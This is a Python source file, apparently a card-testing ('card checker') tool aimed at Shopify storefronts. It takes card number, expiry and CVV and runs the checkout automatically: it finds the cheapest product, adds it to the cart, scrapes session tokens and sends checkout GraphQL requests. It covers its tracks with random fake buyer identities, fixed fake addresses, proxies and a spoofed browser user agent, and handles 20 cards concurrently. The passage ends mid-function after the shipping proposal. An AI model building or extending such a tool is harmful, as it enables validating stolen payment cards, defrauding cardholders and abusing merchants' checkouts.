import asyncio
import aiohttp
import json
import re
import random
import time
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import threading
import ipaddress as _ipaddress

# ═══════════════════════════════════════════════════
# GRAPHQL QUERIES  (unchanged from original)
# ═══════════════════════════════════════════════════

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone __typename}__typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest variantId __typename}...on ContextualizedProductVariantMerchandise{id digest variantId price{amount currencyCode __typename}__typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle methodType amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{intermediateRates deliveryLines{id destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle methodType amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest variantId __typename}...on ContextualizedProductVariantMerchandise{id digest variantId price{amount currencyCode __typename}__typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}"""

QUERY_PROPOSAL_DELIVERY = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone __typename}__typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest variantId __typename}...on ContextualizedProductVariantMerchandise{id digest variantId price{amount currencyCode __typename}__typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle methodType amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{intermediateRates deliveryLines{id destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle methodType amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id digest variantId __typename}...on ContextualizedProductVariantMerchandise{id digest variantId price{amount currencyCode __typename}__typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

# ═══════════════════════════════════════════════════
# ADDRESS / IDENTITY
# ═══════════════════════════════════════════════════

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG",
}

ADDR_BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550100"},
    "CA": {"address1": "200 Queen St", "city": "Toronto", "postalCode": "M5V 3G6", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker St", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "10 MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Khalifa St 1", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "971501234567"},
    "HK": {"address1": "88 Nathan Rd", "city": "Kowloon", "postalCode": "000000", "zoneCode": "KOW", "countryCode": "HK", "phone": "85255551234"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8001", "zoneCode": "ZH", "countryCode": "CH", "phone": "441234567"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "4930123456"},
    "NZ": {"address1": "1 Queen St", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "6491234567"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "SG", "countryCode": "SG", "phone": "6561234567"},
}

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David",
               "Mary", "Patricia", "Jennifer", "Linda", "Emma", "Oliver"]
LAST_NAMES  = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
               "Miller", "Davis", "Taylor", "Anderson", "Wilson", "Moore"]


def pick_addr(site_url: str, currency: str = "USD") -> dict:
    tld = urlparse(site_url).netloc.split('.')[-1].upper()
    if tld in ADDR_BOOK:
        return ADDR_BOOK[tld]
    cc = C2C.get(currency.upper(), "US")
    return ADDR_BOOK.get(cc, ADDR_BOOK["US"])


def random_identity():
    fn = random.choice(FIRST_NAMES)
    ln = random.choice(LAST_NAMES)
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "icloud.com"]
    email = f"{fn.lower()}.{ln.lower()}{random.randint(10,999)}@{random.choice(domains)}"
    return fn, ln, email


def parse_proxy(proxy_str: str) -> str | None:
    if not proxy_str:
        return None
    p = proxy_str.strip()
    if p.startswith(("http://", "https://", "socks5://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return f"http://{user}:{pw}@{host}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══════════════════════════════════════════════════
# SSRF GUARD
# ═══════════════════════════════════════════════════

_PRIVATE_NETS = [
    _ipaddress.ip_network(n) for n in
    ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
     "127.0.0.0/8", "169.254.0.0/16", "::1/128", "fc00::/7"]
]

def _safe_url(url: str) -> bool:
    try:
        host = urlparse(url).hostname or ""
        if not host:
            return False
        if host.lower() in ("localhost", "metadata.google.internal", "169.254.169.254"):
            return False
        try:
            addr = _ipaddress.ip_address(host)
            return not any(addr in net for net in _PRIVATE_NETS)
        except ValueError:
            return True
    except Exception:
        return False


# ═══════════════════════════════════════════════════
# PRODUCT / VARIANT CACHE
# ═══════════════════════════════════════════════════

_variant_cache: dict = {}  # domain -> {variant_id, price, ts}
_CACHE_TTL = 1800           # 30 min


async def fetch_cheapest_variant(domain: str, proxy_str: str | None = None) -> dict | tuple:
    """Fetch cheapest available variant from /products.json.
    Returns dict with variant_id and price, or (False, error_str)."""
    base = domain if domain.startswith("http") else f"https://{domain}"
    proxy = parse_proxy(proxy_str)

    connector = aiohttp.TCPConnector(ssl=False)
    timeout   = aiohttp.ClientTimeout(total=15)

    best = None
    min_price = float("inf")
    is_shopify = False

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        for page in range(1, 3):  # max 2 pages × 250 = 500 products
            url = f"{base}/products.json?limit=250&page={page}"
            try:
                async with session.get(url, proxy=proxy,
                                       timeout=aiohttp.ClientTimeout(total=12)) as resp:
                    if resp.status == 429:
                        return False, "RATE_LIMITED"
                    if resp.status != 200:
                        if page == 1:
                            return False, f"HTTP_{resp.status}"
                        break
                    text = await resp.text()
                    if page == 1:
                        if "shopify" not in text.lower():
                            return False, "NOT_SHOPIFY"
                        is_shopify = True
                    data = await resp.json(content_type=None)
                    products = data.get("products", [])
                    if not products:
                        break
            except asyncio.TimeoutError:
                if page == 1:
                    return False, "TIMEOUT"
                break
            except Exception as e:
                if page == 1:
                    return False, f"ERROR:{e}"
                break

            for product in products:
                handle = product.get("handle", "")
                for v in product.get("variants", []):
                    if not v.get("available", True):
                        continue
                    try:
                        price = float(str(v.get("price", "0")).replace(",", ""))
                        if 0 < price < min_price:
                            min_price = price
                            best = {
                                "variant_id": str(v["id"]),
                                "price": f"{price:.2f}",
                                "handle": handle,
                            }
                    except (ValueError, TypeError, KeyError):
                        continue

            if len(products) < 250:
                break  # last page

    if best:
        return best
    if not is_shopify:
        return False, "NOT_SHOPIFY"
    return False, "NO_PRODUCTS"


def _extract(text: str, start: str, end: str) -> str | None:
    try:
        i = text.index(start) + len(start)
        j = text.index(end, i)
        result = text[i:j]
        return result if result else None
    except ValueError:
        return None


def _is_captcha(text: str) -> bool:
    if not text:
        return False
    t = text.upper()
    # Strict CAPTCHA detection — only trigger on actual API response codes,
    # NOT on page HTML that might contain "hcaptcha" in script URLs
    return ('"CAPTCHA_REQUIRED"' in text or
            "'CAPTCHA_REQUIRED'" in text or
            '"code":"CAPTCHA"' in text or
            "CAPTCHA_CHALLENGE" in t)


def _clean_response(msg: str) -> str:
    if not msg:
        return "UNKNOWN_ERROR"
    msg = str(msg)
    # Extract structured error codes first
    for pat in [r'"code"\s*:\s*"([^"]+)"', r"'code'\s*:\s*'([^']+)'",
                r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]{3,}_[A-Z_]{3,})']:
        m = re.search(pat, msg)
        if m:
            code = m.group(1).strip(' \'"{}')
            if len(code) < 80:
                return code
    return msg[:60]


# ═══════════════════════════════════════════════════
# SEMAPHORE & LOOP
# ═══════════════════════════════════════════════════

_SEMAPHORE: asyncio.Semaphore | None = None
_loop = asyncio.new_event_loop()


def _start_loop(loop: asyncio.AbstractEventLoop):
    global _SEMAPHORE
    asyncio.set_event_loop(loop)
    _SEMAPHORE = asyncio.Semaphore(20)
    loop.run_forever()


_loop_thread = threading.Thread(target=_start_loop, args=(_loop,), daemon=True)
_loop_thread.start()

import time as _time
_w = 0
while _SEMAPHORE is None and _w < 5:
    _time.sleep(0.05); _w += 0.05


# ═══════════════════════════════════════════════════
# CORE CHECKOUT
# ═══════════════════════════════════════════════════

async def process_card(cc: str, mes: str, ano: str, cvv: str,
                       site_url: str, variant_id: str | None = None,
                       proxy_str: str | None = None):
    """Top-level card processor. Returns (success, message, gateway, price, currency)."""
    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"
    if not _safe_url(ourl):
        return False, "INVALID_SITE_URL", "UNKNOWN", "0.00", "USD"

    async with _SEMAPHORE:
        return await _checkout(cc, mes, ano, cvv, ourl, variant_id, proxy_str)


async def _checkout(cc, mes, ano, cvv, ourl, variant_id, proxy_str):
    gateway      = "UNKNOWN"
    total_price  = "0.00"
    currency     = "USD"
    proxy        = parse_proxy(proxy_str)

    try:
        fn, ln, email = random_identity()

        # ── 1. Resolve variant ──────────────────────────────────────────────
        cache_key = urlparse(ourl).netloc
        if not variant_id:
            cached = _variant_cache.get(cache_key)
            if cached and (time.time() - cached["ts"]) < _CACHE_TTL:
                variant_id  = cached["variant_id"]
                cached_price = cached.get("price", "0.01")
            else:
                info = await fetch_cheapest_variant(ourl, proxy_str)
                if isinstance(info, tuple) and not info[0]:
                    return False, info[1], gateway, total_price, currency
                variant_id   = info["variant_id"]
                cached_price = info["price"]
                _variant_cache[cache_key] = {
                    "variant_id": variant_id,
                    "price": cached_price,
                    "ts": time.time(),
                }
        else:
            cached_price = "0.01"

        # ── 2. Resolve address ──────────────────────────────────────────────
        addr = pick_addr(ourl)
        cc_country = addr["countryCode"]

        # ── 3. Build session via cart + checkout ────────────────────────────
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        base_headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
        }

        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=35)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

            # Add to cart
            cart_url = f"{ourl}/cart/add.js"
            for attempt in range(2):
                try:
                    if attempt == 0:
                        cr = await session.post(
                            cart_url,
                            data=f"id={variant_id}&quantity=1",
                            headers={**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
                            proxy=proxy,
                        )
                    else:
                        cr = await session.post(
                            cart_url,
                            json={"items": [{"id": int(variant_id), "quantity": 1}]},
                            headers=base_headers,
                            proxy=proxy,
                        )
                    if cr.status == 200:
                        break
                except Exception:
                    pass
            else:
                return False, "CART_FAILED", gateway, total_price, currency

            # Navigate to checkout
            checkout_headers = {
                **base_headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
            }
            resp = await session.post(
                f"{ourl}/checkout/",
                allow_redirects=True,
                headers=checkout_headers,
                proxy=proxy,
            )
            checkout_url = str(resp.url)

            if "login" in checkout_url.lower():
                return False, "LOGIN_REQUIRED", gateway, total_price, currency

            text = await resp.text()

            # Extract session token
            sst = (resp.headers.get("X-Checkout-One-Session-Token") or
                   resp.headers.get("x-checkout-one-session-token"))
            if not sst:
                for s, e in [
                    ('name="serialized-sessionToken" content="&quot;', '&quot;'),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('"sessionToken":"', '"'),
                ]:
                    sst = _extract(text, s, e)
                    if sst:
                        break
            if not sst:
                return False, "NO_SESSION_TOKEN", gateway, total_price, currency

            # Extract attempt token (checkout ID)
            m = re.search(r'/checkouts/cn/([^/?&#"]+)', checkout_url)
            attempt_token = m.group(1) if m else checkout_url.rstrip("/").split("/")[-1].split("?")[0]

            # Extract build ID
            unesc = text.replace("&quot;", '"').replace("&amp;", "&")
            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
            if bm:
                build_id = bm.group(1)

            # Extract identification signature
            ident_sig = None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unesc)
            if im:
                ident_sig = im.group(1)

            # Extract queueToken (optional — may not exist)
            queueToken = (_extract(text, 'queueToken&quot;:&quot;', '&quot;') or
                          _extract(text, '"queueToken":"', '"'))

            # Extract stableId — try multiple patterns
            stableId = (_extract(text, 'stableId&quot;:&quot;', '&quot;') or
                        _extract(text, '"stableId":"', '"') or
                        "line-1")

            # Extract merch ID — prefer raw JSON, fallback to escaped, fallback to variant_id
            merch_id = (_extract(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                        _extract(text, 'ProductVariantMerchandise/', '&quot;') or
                        _extract(text, 'ProductVariantMerchandise/', '"') or
                        str(variant_id))

            # Extract currency from JSON (prefer cart-level currency, not nested)
            currency = "USD"
            cur_matches = re.findall(r'"currencyCode"\s*:\s*"([A-Z]{3})"', unesc)
            if cur_matches:
                currency = cur_matches[0]  # first occurrence = cart currency

            # GraphQL endpoint
            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"

            gql_headers = {
                **base_headers,
                "Content-Type": "application/json",
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            if build_id:
                gql_headers["x-checkout-web-build-id"] = build_id
                gql_headers["x-checkout-web-deploy-stage"] = "production"

            # ── 4. Shipping proposal ────────────────────────────────────────
            # Use "any" for expectedTotalPrice to avoid price mismatch errors
            merch_term = {
                "merchandiseLines": [{
                    "stableId": stableId,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{merch_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None,
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},  # ← key fix: no price mismatch
                    "lineComponentsSource": None,
                    "lineComponents": [],
                }]
            }

            delivery_term = {
                "deliveryLines": [{
                    "destination": {
                        "partialStreetAddress": {
                            "address1": addr["address1"],
                            "address2": "",
                            "city": addr["city"],
                            "countryCode": cc_country,
                            "postalCode": addr["postalCode"],
                            "firstName": fn,
                            "lastName": ln,
                            "zoneCode": addr["zoneCode"],
                            "phone": addr["phone"],
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True},
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["SHIPPING"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True,
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True,
            }

            base_vars = {
                "sessionInput": {"sessionToken": sst},
                "queueToken": queueToken,  # None if not found — NOT empty string
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "merchandise": merch_term,
                "delivery": delivery_term,
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": "", "city": "", "countryCode": cc_country,
                            "lastName": "", "zoneCode": addr["zoneCode"], "phone": "",
                        }
                    },
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": cc_country},
                    "email": email,
                    "emailChanged": False,
                    "phoneCountryCode": cc_country,
                    "marketingConsent": [],
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "taxes": {
                    "proposedAllocations": None,
                    "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                    "proposedTotalIncludedAmount": None,
                    "proposedMixedStateTotalAmount": None,
                    "proposedExemptions": [],
                },
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {
                    "signature": None, "signatureUuid": None,
                    "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                },
                "optionalDuties": {"buyerRefusesDuties": False},
            }

            ship_payload = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": base_vars,
                "operationName": "Proposal",
            }

            async def post_gql(payload: dict, op: str) -> tuple[aiohttp.ClientResponse, str]:
                for _ in range(2):
                    try:
                        r = await session.post(
                            graphql_url,
                            params={"operationName": op},
                            headers=gql_headers,
                            json=payload,
                            proxy=proxy,
                        )
                        t = await r.text()
                        return r, t
                    except asyncio.TimeoutError:
                        await asyncio.sleep(1)
                return None, ""

            _, ship_text = await post_gql(ship_payload, "Proposal")

            if not ship_text:
                return False, "SHIPPING_PROPOSAL_TIMEOUT", gateway, total_price, currency
            if _is_captcha(ship_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                ship_json = json.loads(ship_text)
            except json.JSONDecodeError:
                return False, f"INVALID_JSON_SHIP", gateway, total_price, currency

            if "errors" in ship_json and not ship_json.get("data"):
                errs = ship_json["errors"]
                return False, f"GQL_ERROR:{errs[0].get('message','')[:60]}", gateway, total_price, currency

            try:
                neg = ship_json["data"]["session"]["negotiate"]
                result = neg["result"]
                rtype = result.get("__typename", "")

                if rtype == "CheckpointDenied":
                    return False, "CHECKPOINT_DENIED", gateway, total_price, currency
                if rtype == "Throttled":
                    return False, "THROTTLED", gateway, total_price, currency
                if rtype == "NegotiationResultFailed":
                    # Retry once by clearing cart and re-adding
                    return False, "NEGOTIATION_FAILED", gateway, total_price, currency

                checkpoint_data = result.get("checkpointData")
                seller = result["sellerProposal"]

                # ── Extract currency + price from the actual proposal response ──
                # This is the authoritative price — avoids HTML-scrape mismatch
                merch_lines = (seller.get("merchandise") or {}).get("merchandiseLines", [])
                actual_subtotal = cached_price  # safe fallback
                if merch_lines:
                    total_amt = merch_lines[0].get("totalAmount", {})
                    val = (total_amt.get("value") or {})
                    if val.get("amount"):
                        actual_subtotal = val["amount"]
